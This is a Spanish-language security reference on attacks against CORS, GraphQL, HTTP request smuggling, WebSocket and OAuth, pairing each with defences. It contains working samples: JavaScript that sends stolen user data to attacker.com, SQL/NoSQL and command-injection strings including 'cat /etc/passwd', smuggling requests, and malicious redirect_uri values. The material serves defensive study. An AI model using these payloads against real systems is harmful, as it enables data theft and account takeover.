# Seguridad de protocolos web modernos

> **Fuente**: extraído de la base de vulnerabilidades WooYun, OWASP y prácticas de seguridad de la industria, cubre las cinco grandes superficies de ataque de protocolos web modernos: CORS, GraphQL, contrabando de peticiones HTTP, WebSocket y OAuth.
> **Metodología**: fórmula esencial de vulnerabilidades de WooYun + análisis sistemático L1-L4

---

## 1. Configuración incorrecta de CORS

### 1.1 Esencia de la vulnerabilidad

```
Riesgo CORS = configuración demasiado permisiva de Access-Control-Allow-Origin × falta de autenticación adicional en interfaces sensibles
```

La política de mismo origen del navegador es una barrera de seguridad; una configuración incorrecta de CORS la rompe, permitiendo que sitios maliciosos lean datos sensibles del usuario entre orígenes.

### 1.2 Método de detección

```bash
# Detección básica: enviar un Origin personalizado y observar la respuesta
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# Revisar las cabeceras de respuesta:
# Access-Control-Allow-Origin: https://evil.com  → ¡peligroso!
# Access-Control-Allow-Credentials: true          → puede llevar Cookie en la solicitud cruzada
```

**Patrones de configuración peligrosos**

| Patrón | Riesgo | Descripción |
|------|------|------|
| `Access-Control-Allow-Origin: *` | Alto | Comodín, cualquier dominio puede leer (pero no puede llevar Cookie) |
| Reflejo dinámico del Origin | Muy alto | Devuelve el Origin de la solicitud directamente como cabecera de respuesta |
| Se permite Origin `null` | Alto | Un `<iframe sandbox>` puede construir un origen null |
| Defecto en coincidencia de regex | Alto | `evil.com.attacker.com` coincide con `evil.com` |
| Comodín de subdominio | Medio | `*.target.com` incluye subdominios ya comprometidos |

### 1.3 Forma de explotación

```html
<!-- Página maliciosa: robo de datos del usuario entre orígenes -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- Explotación con Origin null -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 Medidas de defensa

- **Validar el Origin con una lista blanca estricta**: no reflejar dinámicamente, usar una lista de coincidencia exacta
- Evitar usar `Access-Control-Allow-Origin: *` junto con `Access-Control-Allow-Credentials: true`
- Evitar permitir el Origin `null`
- Las coincidencias de regex deben anclarse (^ y $) para evitar bypass por coincidencia de subcadena
- Añadir autenticación adicional (como token CSRF) en interfaces sensibles, no depender solo de CORS

---

## 2. Seguridad de GraphQL

### 2.1 Esencia de la vulnerabilidad

```
Riesgo GraphQL = potente capacidad de consulta × mecanismo de introspección abierto por defecto × falta de autorización granular
```

GraphQL expone todo el modelo de datos en un único endpoint; el mecanismo de introspección proporciona documentación completa de la API, el atacante no necesita adivinar las interfaces.

### 2.2 Consulta de introspección - filtración de información

```graphql
# Obtener el Schema completo (tipos, campos, parámetros)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Versión reducida: solo obtener el tipo de consulta
{__schema{queryType{name,fields{name}}}}

# Obtener la lista de mutations
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 Vectores de ataque comunes

**Ataques de inyección**

```graphql
# Concatenación de parámetros que provoca inyección SQL
{ user(name: "admin' OR '1'='1") { id email } }

# Inyección NoSQL
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**DoS por consultas masivas (consultas anidadas que agotan recursos)**

```graphql
# Anidamiento profundo - consultas exponenciales a la base de datos
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# Consultas masivas con alias - enumerar grandes cantidades de datos en una sola solicitud
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# Fuerza bruta con mutations masivas
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**Bypass de autenticación**

```graphql
# La mutation carece de verificación de autorización
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 Medidas de defensa

- **Deshabilitar la consulta de introspección en producción**: verificar solicitudes `__schema`/`__type` y rechazarlas
- Límite de profundidad de consulta (se recomienda un máximo de 10 niveles) y análisis de complejidad
- Límite de tasa y timeout de consulta (previene DoS por consultas masivas/anidadas)
- Control de permisos a nivel de campo (cada resolver con autorización independiente)
- Procesamiento parametrizado de parámetros de entrada (previene inyección), prohibir construir consultas por concatenación de strings
- Usar consultas persistidas (Persisted Queries), permitiendo solo la ejecución de consultas preregistradas

---

## 3. Contrabando de peticiones HTTP (Request Smuggling)

### 3.1 Esencia de la vulnerabilidad

```
El proxy frontend (CDN/LB) y el servidor backend interpretan de forma inconsistente los límites de la solicitud HTTP
→ Se "contrabandea" una solicitud adicional dentro de una conexión TCP → afecta el procesamiento de solicitudes de otros usuarios
```

Conflicto central: cuando `Content-Length` (CL) y `Transfer-Encoding: chunked` (TE) están presentes simultáneamente, el frontend y el backend eligen cabeceras distintas para interpretar la solicitud.

### 3.2 Tres tipos de ataque

| Tipo | Interpretación del frontend | Interpretación del backend | Descripción |
|------|----------|----------|------|
| CL.TE | Content-Length | Transfer-Encoding | El frontend reenvía según CL, el backend interpreta según TE |
| TE.CL | Transfer-Encoding | Content-Length | El frontend reenvía según TE, el backend interpreta según CL |
| TE.TE | Transfer-Encoding | Transfer-Encoding | Se ofusca la cabecera TE para que una de las partes la ignore |

### 3.3 Payloads clásicos

**Contrabando CL.TE**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Contrabando TE.CL**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**Variante de ofuscación TE.TE**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 Detección y explotación

```
Método de detección:
1. Enviar una solicitud con conflicto CL/TE y observar timeouts/respuestas anómalas
2. Contrabandear una solicitud incompleta y ver si afecta a las solicitudes posteriores
3. Herramienta: extensión HTTP Request Smuggler de Burp Suite

Escenarios de explotación:
- Bypass del WAF/ACL del frontend → contrabandear una solicitud maliciosa hacia el backend
- Secuestro de solicitudes de otros usuarios → robo de Cookie/Session
- Envenenamiento de caché → contrabandear una solicitud que contamine el contenido cacheado del CDN
- Secuestro de enrutamiento de solicitudes → dirigir la solicitud hacia un backend arbitrario
```

### 3.5 Medidas de defensa

- Usar la misma librería/versión de análisis HTTP en frontend y backend
- Prohibir que aparezcan simultáneamente las cabeceras CL y TE, rechazar solicitudes ambiguas
- Deshabilitar la reutilización de conexiones Keep-Alive de HTTP/1.0 en el backend
- Actualizar a HTTP/2 (protocolo de tramas binario, inmune por naturaleza a la ambigüedad CL/TE)
- Normalizar las cabeceras de solicitud en el CDN/LB antes de reenviarlas

---

## 4. Seguridad de WebSocket

### 4.1 Esencia de la vulnerabilidad

```
Riesgo de WebSocket = tras el handshake HTTP se sale del modelo de seguridad tradicional × el canal bidireccional persistente carece de autenticación por mensaje
```

Una vez establecida la conexión WebSocket, los mensajes posteriores ya no pasan por los mecanismos de seguridad HTTP estándar (Cookie SameSite/token CSRF, etc.).

### 4.2 Secuestro de WebSocket entre sitios (CSWSH)

```html
<!-- Página maliciosa: secuestra la conexión WebSocket del usuario -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // Envía la solicitud suplantando a la víctima
};
ws.onmessage = function(e) {
    // Roba los datos de la respuesta
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**Principio**: el handshake de WebSocket es una solicitud HTTP estándar, el navegador incluye automáticamente la Cookie. Si el servidor no valida la cabecera Origin, una página maliciosa puede establecer una conexión ws ya autenticada.

### 4.3 Inyección de mensajes

```javascript
// Envío de payloads de inyección a través de WebSocket
ws.send('{"query": "admin\' OR 1=1--"}');          // Inyección SQL
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // Inyección de comandos
```

### 4.4 Autenticación insuficiente

| Problema | Riesgo | Descripción |
|------|------|------|
| Solo se autentica en el handshake | La conexión sigue válida tras expirar la sesión | La conexión ws puede durar horas |
| Sin autorización por mensaje | Cualquier cliente conectado puede ejecutar todas las operaciones | Falta verificación de autorización por mensaje |
| Token en texto plano | WebSocket sin cifrar (ws://) | Usar wss:// para forzar el cifrado |

### 4.5 Medidas de defensa

- **Validar la cabecera Origin**: verificar que el Origin esté en la lista blanca durante el handshake (previene CSWSH)
- **Autenticación por token**: pasar el token mediante parámetro de URL o primer mensaje durante el handshake (sin depender de la Cookie)
- **Validación de mensajes**: aplicar validación de entrada y codificación de salida a cada mensaje (previene inyección)
- Usar wss:// para forzar el cifrado del transporte
- Implementar mecanismo de heartbeat y desconexión automática por timeout de sesión
- Límite de tasa de mensajes (previene DoS)

---

## 5. Seguridad de OAuth 2.0/OIDC

### 5.1 Esencia de la vulnerabilidad

```
Riesgo de OAuth = flujo de interacción multiparte complejo × validación de parámetros poco estricta × implementación que se desvía de la especificación
```

El flujo de autorización de OAuth involucra la interacción de tres partes: cliente, servidor de autorización y servidor de recursos; una configuración incorrecta en cualquiera de ellas puede provocar filtración de tokens o toma de control de cuentas.

### 5.2 Manipulación de redirect_uri

```
# Flujo normal
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# Ataque: manipular redirect_uri para robar el código de autorización
redirect_uri=https://attacker.com/steal           # Reemplazo completo
redirect_uri=https://app.com.attacker.com/callback # Confusión de subdominio
redirect_uri=https://app.com/callback/../../../attacker # Traversal de rutas
redirect_uri=https://app.com/callback?next=https://attacker.com # Cadena de redirección abierta
```

### 5.3 Vectores de ataque comunes

| Tipo de ataque | Principio | Condición de explotación |
|----------|------|----------|
| Ataque CSRF | Falta el parámetro state o es predecible | Vincula la cuenta del atacante a la víctima |
| Filtración de token (Referer) | El token del modo implícito va en el Fragment de la URL | La página contiene referencias a recursos externos |
| Filtración de token (logs) | El código de autorización/token queda registrado en los logs del servidor | Los logs son accesibles |
| Bypass de PKCE | El cliente público no usa code_challenge | Interceptar el código de autorización basta para canjear el token |
| Confusión de IdP (Mix-Up) | Confusión del origen de la respuesta de autorización en escenarios multi-IdP | El cliente soporta varios proveedores OAuth |
| Reproducción del código de autorización | El código de autorización no es de un solo uso | Interceptar el código y canjearlo repetidamente |

### 5.4 CSRF y el parámetro state

```
# Flujo del ataque (cuando falta state)
1. El atacante inicia la autorización OAuth y obtiene el código de autorización de su propia cuenta
2. Construye el enlace: https://app.com/callback?code=ATTACKER_CODE
3. Engaña a la víctima para que haga clic → la cuenta de la víctima se vincula a la cuenta de terceros del atacante
4. El atacante inicia sesión con la cuenta de terceros → toma control de la cuenta de la víctima

# Defensa: parámetro state
state=valor aleatorio impredecible (vinculado a la sesión del usuario)
→ al recibir el callback, verificar que state coincida con la sesión
```

### 5.5 Riesgo del modo implícito

```
# Modo implícito (Implicit Flow) - ya no se recomienda
https://app.com/callback#access_token=eyJ...&token_type=bearer

Riesgos:
- El token va en el Fragment de la URL, puede filtrarse por el historial del navegador/cabecera Referer
- No se puede usar refresh_token, mala experiencia de usuario
- No se puede vincular la identidad del cliente (sin client_secret)

→ Alternativa: Authorization Code Flow + PKCE
```

### 5.6 Medidas de defensa

- **Lista blanca estricta de redirect_uri**: coincidencia exacta (no permitir comodines/subrutas)
- **Forzar el parámetro state**: vinculado a la sesión, impredecible, de un solo uso
- **Forzar PKCE**: todos los clientes (especialmente clientes públicos/SPA) deben usar code_challenge
- Usar Authorization Code Flow, descartar Implicit Flow
- Código de autorización de un solo uso, vida útil corta (se recomienda menos de 10 minutos)
- Vinculación de token (DPoP/mTLS) para prevenir el uso indebido de tokens robados
- Auditar periódicamente las aplicaciones de terceros autorizadas y el alcance de sus permisos

---

*Extraído de la base de vulnerabilidades WooYun (88,636 casos) + estándares de seguridad OWASP/RFC | Solo para investigación de seguridad y referencia defensiva*
